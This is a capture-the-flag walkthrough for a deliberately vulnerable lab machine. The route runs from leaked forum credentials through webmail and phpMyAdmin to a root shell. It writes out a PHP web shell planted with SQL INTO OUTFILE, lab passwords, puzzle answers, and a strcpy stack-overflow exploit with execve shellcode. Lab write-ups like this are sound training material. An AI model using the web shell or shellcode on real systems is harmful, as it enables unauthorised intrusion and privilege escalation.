## Laurie entrypoint starting from /forum

Since we have access to /forum we can start gathering info
Some user are:
- admin
- lmezard
- zaz
- thor
- wandre
- qudevide

In a post we find a login and a password that was misstyped by lmezard
The password is `!q\]Ej?*5K5cy*AJ`

With this we can connect to the forum as lmezard, and this let us this her email on her profile
lmezard email is `laurie@borntosec.net`
Her password is the same than her forum password
Now we can connect as laurie on /webmail

She has 2 mail, one containing db root access we can use on /phpmyadmin
`user: root
 pass: Fg'kKXBj87E:aJ$`
Interesting to note that the sender email is `qudevide@mail.borntosec.net`
and laurie sent the same email to `ft_root@mail.borntosec.net`

Now we have access to the database which gives us some software additional info:
- Server: Localhost via UNIX socket
- Server version: 5.5.44-0ubuntu0.12.04.1
- Protocol version: 10
- User: root@localhost
- MySQL charset: UTF-8 Unicode (utf8)

## Reverse shell
From native SQL QUERY we can create file
The root dir of mysql on the system seems to be /var/lib/mysql/
Except here it looks like we cant create a file anywhere on the system
After a lot of tries everywhere, we discovered we can write inside /forum/templates_c/
To do the reverse shell we can do it in php with the shell_exec command

SELECT '<form method="get"><label><input type="text" name="cmd" value=""></label><button>Exec</button></form><?php if(isset($_GET["cmd"])){ $output = shell_exec($_GET["cmd"]); echo "<pre>$output</pre>"; } ?>' INTO OUTFILE "/var/www/forum/templates_c/sh.php"

Then we can execute command logged in as www-var, wich is the apache2 users
Looking around the system, we find a password file in /home/LOOKATME/password
The credentials inside are : `lmezard:G!@M6f4Eatau{sF"`

They are ftp credentials, when connecting to the ftp server there is pcap file,
We have to extract the archive with tar and sort the file inside
We can automate them in a script and recompile the C file or just
`grep -R getme ft_fun -A 3`
`grep -R return ft_fun -A 3` to sort them manually, there is only 12 char we need

The result we get is : Iheartpwnage
When we sha256 it we get the ssh credentials for the laurie acc `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Now we're logged in as laurie, we see a 'bomb' software that is a 32 binary
We can reverse it and solve the 6 steps then concatenate the result and we'll have the password for the thor acc

## The bomb
When looking at the reversed code we see some strange stuff like the secret phase that we can activate on stage 4 by adding 'austinpowers'
But it doesnt seem to do anything meaningful, likewise there is some intriguing function like send_mail but it doesnt look activated at all for now
Back to solving each regular step of the bomb ->

1/ Public speaking is very easy.
2/ 1 2 6 24 120 720
3/ 5 t 458
4/ 9
5/ opekma
6/ 4 2 6 3 1 5

Quick notes on step 3:
Solution is 5 t 458 but there can be other
Like 1b2149

Quick notes on step 4:
The rank for which fibonacci = 55
Its 9

Quick notes on step 5:
Solution is opekma but there can be other
Like opekmq

There is probably 2 way to do this challenge, either crack the logic of the mask which we didnt
Or send the whole alphabet to create a table to find the match to 'giants'
abcdef: srveaw
ghijkl: hobpnu
mnopqr: tfgisr
stuvwx: veawho
yz: bp

Quick notes on step 6:
read6 func so we understand the input has 6 char
The first while check that all input are number < 7
Second and third while sets up the linked list according to some rule we dont need to understand
Fourth while and last part of the code is just a simple step through the linked list
And it checks that each node value is lesser than the previous one
*if (current node < next node)*
   *explode*
*current node = next node*
The answer is `4 2 6 3 1 5`
We can verify this by just sending 123456 to check node value right before the last step in gdb

The final password for thor is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Turtle

We have a series of instructions, when visualised with a python script (check script repo)
We get a stylised "SLASH"
When we md5 it we get the password for zaz user: `646da671ca01bb5d84dbb5fb2238dc8e`

## Overflow binary

In zaz repo there is a binary that is vulnerable to a stack overflow, through a call to strcpy.
The binary take one argument, that's where we place our shellcode. We try to find the address of
strcpy dest (approximately 0xbffff660) to replace the main return address. We add a nop slide before
the shellcode, so we have more odds to get to it:

./exploit_me $(python -c "print '\x90' * 32 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x60\xf6\xff\xbf' * 21")

Since the vulnerable binary is setuid with root right the shell we get from the shellcode is as root

We can verify with a `whoami` inside and have our interactive shell as root on the machine
Hooray!!
